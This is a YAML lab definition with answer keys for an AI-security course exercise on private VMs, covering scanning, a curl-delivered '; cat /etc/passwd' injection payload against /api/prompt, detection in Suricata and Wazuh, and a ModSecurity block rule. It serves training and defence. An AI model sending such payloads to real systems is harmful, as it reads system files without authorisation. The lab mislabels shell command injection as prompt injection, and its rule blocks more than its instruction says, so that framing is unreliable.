@@ -1,0 +1,128 @@
+lab_id: latest-NEWS-f8fad72b88-C7-ai-security
+title: Prompt Injection Vulnerability (CVE NEWS-f8fad72b88) Lab
+version: ai
+course: C7 ai-security
+week: 0
+description: Microsoft Copilot과 Salesforce Agentforce에서 보고된 프롬프트 주입 취약점을 재현하고, 탐지
+  및 대응 방법을 실습합니다.
+difficulty: medium
+duration_minutes: 60
+objectives:
+- 프롬프트 주입 공격을 재현한다
+- 네트워크 탐지 시스템으로 공격을 식별한다
+- SIEM에서 알림을 분석한다
+- 보호 규칙을 적용해 공격을 차단한다
+pass_threshold: 0.5
+steps:
+- order: 1
+  instruction: Attacker VM에서 웹 서버(10.20.30.80)의 포트를 스캔하여 서비스 정보를 확인하세요.
+  hint: nmap -sV 옵션을 사용합니다.
+  category: recon
+  points: 10
+  answer: '프롬프트: nmap -sV 10.20.30.80'
+  answer_detail: nmap이 80/tcp (http)와 3000/tcp (juice shop) 등을 표시하면 성공.
+  verify:
+    type: output_contains
+    expect: 80/tcp open  http
+    field: stdout
+  target_vm: attacker
+  script: nmap -sV 10.20.30.80
+  risk_level: low
+  bastion_prompt: Attacker VM에서 nmap을 실행하여 웹 서버 포트를 스캔합니다.
+- order: 2
+  instruction: Nikto를 이용해 웹 애플리케이션에 존재하는 취약점(프롬프트 주입 가능 엔드포인트)을 찾아보세요.
+  hint: Nikto는 기본적으로 80 포트를 검사합니다. 포트 3000도 지정해 주세요.
+  category: scan
+  points: 10
+  answer: '프롬프트: nikto -h http://10.20.30.80:3000'
+  answer_detail: Nikto 출력에 '/api/prompt' 같은 엔드포인트가 표시되면 성공.
+  verify:
+    type: output_contains
+    expect: /api/prompt
+    field: stdout
+  target_vm: attacker
+  script: nikto -h http://10.20.30.80:3000
+  risk_level: low
+  bastion_prompt: Attacker VM에서 Nikto를 실행해 취약한 API 엔드포인트를 찾습니다.
+- order: 3
+  instruction: 프롬프트 주입을 시도합니다. 아래와 같은 악의적인 프롬프트를 전송해 보세요.
+  hint: curl -X POST -d "prompt=..." 형식으로 전송합니다.
+  category: exploit
+  points: 20
+  answer: '프롬프트: curl -X POST -d "prompt=; cat /etc/passwd" http://10.20.30.80:3000/api/prompt'
+  answer_detail: 응답에 /etc/passwd 내용이 포함되면 성공.
+  verify:
+    type: output_contains
+    expect: 'root:x:0:0:'
+    field: stdout
+  target_vm: attacker
+  script: curl -s -X POST -d "prompt=; cat /etc/passwd" http://10.20.30.80:3000/api/prompt
+  risk_level: high
+  bastion_prompt: Attacker VM에서 curl을 이용해 프롬프트 주입 공격을 수행합니다.
+- order: 4
+  instruction: Secu VM에서 Suricata 로그를 확인하여 위 공격에 대한 알림이 생성되었는지 확인하세요.
+  hint: Suricata 로그는 /var/log/suricata/eve.json에 저장됩니다. grep을 활용합니다.
+  category: detect
+  points: 10
+  answer: '프롬프트: grep "cat /etc/passwd" /var/log/suricata/eve.json'
+  answer_detail: 로그에 "alert"와 해당 payload가 포함되면 성공.
+  verify:
+    type: output_contains
+    expect: '"alert"'
+    field: stdout
+  target_vm: secu
+  script: grep "cat /etc/passwd" /var/log/suricata/eve.json
+  risk_level: medium
+  bastion_prompt: Secu VM에서 Suricata 로그를 검색해 프롬프트 주입 시도를 탐지합니다.
+- order: 5
+  instruction: SIEM VM에서 Wazuh Manager를 이용해 최근 5분간 생성된 알림을 조회하세요.
+  hint: Wazuh API를 curl로 호출합니다. 토큰은 미리 설정되어 있다고 가정합니다.
+  category: analyze
+  points: 10
+  answer: '프롬프트: curl -s -X GET -H "Authorization: Bearer $TOKEN" "http://localhost:55000/alerts?timeframe=5m"'
+  answer_detail: JSON 결과에 "Prompt Injection" 혹은 위 payload이 포함되면 성공.
+  verify:
+    type: output_contains
+    expect: Prompt Injection
+    field: stdout
+  target_vm: siem
+  script: 'curl -s -X GET -H "Authorization: Bearer $TOKEN" "http://localhost:55000/alerts?timeframe=5m"'
+  risk_level: low
+  bastion_prompt: SIEM VM에서 Wazuh API를 호출해 프롬프트 주입 알림을 확인합니다.
+- order: 6
+  instruction: Web VM에서 ModSecurity 규칙을 추가하여 '/api/prompt' 엔드포인트에 ';' 문자를 포함한 요청을
+    차단하세요.
+  hint: 규칙 파일은 /etc/modsecurity/modsecurity.conf에 추가합니다.
+  category: remediate
+  points: 15
+  answer: '프롬프트: echo ''SecRule REQUEST_URI "@beginsWith /api/prompt" "phase:2,deny,status:403,msg:\''Blocked
+    prompt injection\''"'' >> /etc/modsecurity/modsecurity.conf && systemctl reload
+    apache2'
+  answer_detail: 규칙 추가 후 Apache 재시작(또는 reload)하면 차단됩니다.
+  verify:
+    type: output_contains
+    expect: Reloading
+    field: stdout
+  target_vm: web
+  script: echo 'SecRule REQUEST_URI "@beginsWith /api/prompt" "phase:2,deny,status:403,msg:\'Blocked
+    prompt injection\'"' >> /etc/modsecurity/modsecurity.conf && systemctl reload
+    apache2
+  risk_level: low
+  bastion_prompt: Web VM에서 ModSecurity 규칙을 추가하고 Apache를 reload합니다.
+- order: 7
+  instruction: Attacker VM에서 동일한 프롬프트 주입 공격을 다시 시도하고, 차단되었는지 확인하세요.
+  hint: 앞서 사용한 curl 명령을 그대로 실행합니다.
+  category: exploit
+  points: 10
+  answer: '프롬프트: curl -s -o /dev/null -w "%{http_code}" -X POST -d "prompt=; cat /etc/passwd"
+    http://10.20.30.80:3000/api/prompt'
+  answer_detail: HTTP 상태 코드가 403이면 성공적으로 차단된 것입니다.
+  verify:
+    type: output_contains
+    expect: '403'
+    field: stdout
+  target_vm: attacker
+  script: curl -s -o /dev/null -w "%{http_code}" -X POST -d "prompt=; cat /etc/passwd"
+    http://10.20.30.80:3000/api/prompt
+  risk_level: low
+  bastion_prompt: Attacker VM에서 차단된 프롬프트 주입 공격을 재시도합니다.
